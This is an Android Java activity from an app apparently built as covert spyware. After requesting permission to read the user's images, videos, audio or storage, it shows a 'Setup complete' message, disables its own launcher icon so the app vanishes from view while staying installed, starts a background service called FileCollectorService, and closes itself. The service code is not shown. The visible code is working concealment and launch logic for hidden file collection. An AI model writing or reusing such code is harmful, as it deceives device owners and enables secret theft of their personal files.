package com.internet.app;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import java.util.Map;

public class MainActivity extends ComponentActivity {

    private final ActivityResultLauncher<String[]> permissionLauncher =
        registerForActivityResult(
            new ActivityResultContracts.RequestMultiplePermissions(),
            (Map<String, Boolean> result) -> {
                boolean allGranted = true;
                for (Boolean b : result.values()) {
                    if (!b) allGranted = false;
                }
                if (allGranted) {
                    Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
                }
                startServiceAndHide();
            }
        );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissionsAndStart();
    }

    private void requestPermissionsAndStart() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE
            };
        }
        permissionLauncher.launch(permissions);
    }

    private void startServiceAndHide() {
        // Hide the launcher icon (app stays installed)
        try {
            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception ignored) {}

        // Start the foreground service
        Intent serviceIntent = new Intent(this, FileCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 200);
    }
}
